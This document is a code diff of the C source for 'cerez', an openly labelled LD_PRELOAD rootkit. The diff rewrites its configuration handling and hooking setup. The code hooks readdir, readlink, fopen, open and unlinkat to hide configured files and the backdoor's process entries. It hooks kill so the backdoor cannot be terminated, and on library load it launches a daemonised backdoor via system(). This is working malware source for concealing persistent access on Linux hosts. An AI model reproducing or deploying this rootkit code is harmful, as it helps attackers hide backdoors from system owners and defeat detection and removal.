@@ -1,17 +1,14 @@
-// cerez rootkit by ngn
-// see LICENSE.txt
+/*
+ * cerez | an ld_preload rootkit
+ * ==================================
+ * this project is licensed under GNU 
+ * Public License Version 2 (GPLv2),
+ * please see the LICENSE.txt 
+ *
+ * written by ngn - https://ngn13.fun
+*/
 
-// loader overwrites the 
-// syscalls with LD_PRELOAD
-
-// these new malicious
-// syscalls make sure our
-// rootkit won't be found 
-
-#define _GNU_SOURCE
-
-#include "util.c"
-
+// standart libaries
 #include <dirent.h>
 #include <unistd.h>
 #include <errno.h>
@@ -26,174 +23,100 @@
 #include <fcntl.h>          
 #include <sys/stat.h>
 #include <stdarg.h>
-#include "errno.h"
 
-char *CONFIG_FILE = "/etc/cerez.cfg";
-struct cfg{
-  char* backdoor[200];
-  char* whitelist[200];
-  char* hidden[500]; 
-  int hiddensize;
-  int output;
-  int found;
-};
+#include "config.h"
+#include "util.h"
 
-struct cfg config;
-struct proc process;
-int am_i_backdoor = 0;
-
-int read_cfg(){
-  FILE *fd = ofopen(CONFIG_FILE, "r");
-
-  if(fd==NULL){
-    debug("cant read config\n");
-    return 1;
-  }
-
-  char buffer[128];
-  char split = ':';
-  int hindex = 0; 
-  while((fgets(buffer, 128, fd))!= NULL) {
-    char* clean = replace(buffer, '\n', '\0', strlen(buffer));  
-    char* key = strtok(clean, &split);
-    char* value = strtok(NULL, &split);
-   
-    if(key==NULL && value==NULL){
-      continue;
-    }
-
-    if(strstr(key, "backdoor")){
-      strcpy((char *)config.backdoor, value);
-    }
-
-    if(strstr(key, "whitelist")){
-      strcpy((char*)config.whitelist, value);
-    }
-
-    if(strstr(key, "output")){
-      if(strstr(value, "1"))
-        config.output = 1;
-      else
-        config.output = 0;
-    }
-
-    else{
-      sprintf((char *)config.hidden, "%s %s", (char *)config.hidden, key);
-    }
-    
-    hindex += 1;
-  }
-
-  fclose(fd);
-  config.hiddensize = hindex;
-  return 0;
-};
-
-int is_backdoor(){
-  FILE *fd = ofopen("/proc/self/cmdline", "r");
-
-  if(fd==NULL){
-    debug("cant read /proc/self/cmdline\n");
-    return 1;
-  }
-
-  char buffer[250];
-  ssize_t len = fread(buffer, 1, sizeof(buffer)-1, fd);
-  char* self = replace(buffer, '\0', ' ', len);
-  fclose(fd);
-
-  if(strstr((char *)config.backdoor, self)){
-    return 1;
-  }
-
-  return 0;
-}
+// holds the proc struct 
+// for the backdoor
+struct proc backdoor;
+struct Config cfg;
 
 void _init() {
-  // some defaults
-  config.found = 0;
-  config.output = 0;
-  get_originals();
-  
-  am_i_backdoor = is_backdoor();
-  if(am_i_backdoor==1){
+  debug("hello from init!");
+  cfg.backdoor = "NONE";
+
+  // get the original hooked calls
+  oopen = (int (*)(const char* restrict, int, ...))find_addr("open");
+  okill = (int (*)(pid_t, int))find_addr("kill");
+  oreaddir = (struct dirent* (*)(DIR *))find_addr("readdir");
+  oreadlink = (ssize_t (*)(const char *restrict, char *restrict, size_t))find_addr("readlink");
+  ounlinkat = (int (*)(int, const char*, int))find_addr("unlinkat");  
+  ofopen = (FILE* (*)(const char *restrict, const char *restrict mode))find_addr("fopen64");
+
+  // init and read the config, if fails then return
+  if (init_cfg(&cfg) == -1){
+    return;
+  }
+
+  if (read_cfg(&cfg) == -1){
+    clean_cfg(&cfg);
     return;
   }
  
-  if(read_cfg()==1){
-    return;
-  }
- 
-  config.found = 1;
   // we need to make sure that our 
 	// backdoor is not already running
 	// if so we can start it up
-  process = find_proc((char *)config.backdoor);
-  if(process.alive){
+  backdoor = find_proc(cfg.backdoor);
+  if(backdoor.alive){
 		return;
   }
 	
-	// to start the backdoor 
-	// first fork the current
-	// process creating a 
-	// new child process
+	// to start the backdoor first fork the current
+	// process creating a new child process
 	pid_t fpid = fork();
 	
-  // if pid is set to -1
-	// it means child
+  // if pid is set to -1 it means child
 	// process creation failed
 	if (fpid == 0){	
-    // if not failed,
-		// first we create a
-		// daemon, 0 means
-		// child process should
-		// change dir to root dir,
-		// the other 0 means 
-		// child processes std in/out
-		// will be redirected
-		// to /dev/null
+
+    // if not failed, first we create a
+		// daemon, 0 means child process should
+		// change dir to root dir, the other 0 means 
+		// child processes std in/out will be redirected to /dev/null
 		daemon(0,0);
+
 		// then we execute the backdoor
-		// replacing the process
-		execve((char *)config.backdoor, NULL, NULL);
-		// if execve fails, we just exit
+    system(cfg.backdoor);
+
+		// then we just exit
 		exit(0);  
+
 	}
 
 	return;
 }
 
 bool path_check(const char* pathname){
-  if(strstr(pathname, (char *)config.whitelist)){
-    debug("check passed - whitelist");
+  debug("path check!");
+
+  // if no config then we fine
+  if(strcmp(cfg.backdoor, "NONE")==0){
     return true;
   }
 
-  if(am_i_backdoor==1){
-    debug("check passed - im the backdoor");
+  // check if its a hidden file
+  for (int i = 0; i < cfg.hidden_count;  i++){
+    if(strstr((char *)cfg.hidden[i], pathname)){
+      debug("check failed - hidden file");
+      return false;
+    }
+  }
+
+  // check if its the backdoor process files
+  if (!backdoor.alive){
     return true;
   }
 
-  if(config.found==0){
-    debug("check passed - cfg not found");
-    return true;
-  }
+  //printf("pid: %d\n", backdoor.pid_count);
+  for (int i = 0; i < backdoor.pid_count; i++){
+	  char pid[30];	
+	  sprintf(pid, "%d", backdoor.pid[i]);
 
-	// if(strstr(pathname, "/proc/net/tcp")!=NULL)	
-	//	return false;
-  
-  char fpathname[80];
-  sprintf(fpathname, " %s ", pathname);
-  if(strstr((char *)config.hidden, fpathname)){
-    debug("check failed - hidden file");
-    return false;
-  }
-
-	char pid[30];	
-	sprintf(pid, "%d", process.pid);
-	if(strstr(pathname, pid)){
-    debug("check failed - process file");
-    return false;
+	  if(strstr(pathname, pid)){
+      debug("check failed - process file");
+      return false;
+    }
   }
 
 	return true;
@@ -201,6 +124,10 @@ bool path_check(const char* pathname){
 
 // malicious syscalls
 struct dirent *readdir(DIR *dirp){
+  debug("readdir called!");
+  if (oreaddir == NULL){
+    debug("sex");
+  }
 	struct dirent *dp = oreaddir(dirp);
 		
 	while(dp != NULL && (!path_check(dp->d_name))){
@@ -211,6 +138,7 @@ struct dirent *readdir(DIR *dirp){
 }
 
 ssize_t readlink(const char *restrict pathname, char *restrict buf, size_t bufsiz){
+  debug("readlink called!");
 	if(!path_check(pathname))
 		return -1;
 	
@@ -219,6 +147,7 @@ ssize_t readlink(const char *restrict pathname, char *restrict buf, size_t bufsi
 
 
 FILE* fopen64(const char *restrict pathname, const char *restrict mode){
+  debug("fopen64 called!");
 	if(!path_check(pathname))
 		return NULL;
 
@@ -226,14 +155,15 @@ FILE* fopen64(const char *restrict pathname, const char *restrict mode){
 }
 
 int open(const char *pathname, int flags, ...){
+  debug("open called!");
 	if(!path_check(pathname))
 		return -1;
 
 	// so you might be thinking,
-	// how do you pass the "..."
-	
-	// well idk
+	// how do you pass the "..."	
 
+	// well idk
+  
 	// so i found a easier
 	// solution
 
@@ -243,6 +173,7 @@ int open(const char *pathname, int flags, ...){
 }
 
 int unlinkat(int dirfd, const char *pathname, int flags){
+  debug("unlinkat called!");
 	if(!path_check(pathname))
 		return -1;
 
@@ -250,19 +181,24 @@ int unlinkat(int dirfd, const char *pathname, int flags){
 }
 
 int kill(pid_t pid, int sig){
-  if(process.alive && pid == process.pid){
-    errno = ESRCH;
-    return -1;
+  debug("kill called!");
+  // here it checks if someone is trying to 
+  // kill the backdoor, if thats the case,
+  // then we return ESRCH, indicating that the 
+  // process does not exists, even tho it does 
+
+  // so even if you somehow find the backdoor PID 
+  // you cannot kill it easily
+  if(!backdoor.alive){
+    return okill(pid, sig);
+  } 
+  
+  for(int i = 0; i< backdoor.pid_count; i++){
+    if (pid == backdoor.pid[i]){
+      errno = ESRCH;
+      return -1;
+    }
   }
 
   return okill(pid, sig);
-}
-
-ssize_t write(int fd, const void *buf, size_t count){
-  if(am_i_backdoor==1 || config.output==0 || path_check(buf)){
-    return owrite(fd, buf, count);
-  }
-  
-  errno = EBADF;
-  return -1;
 }
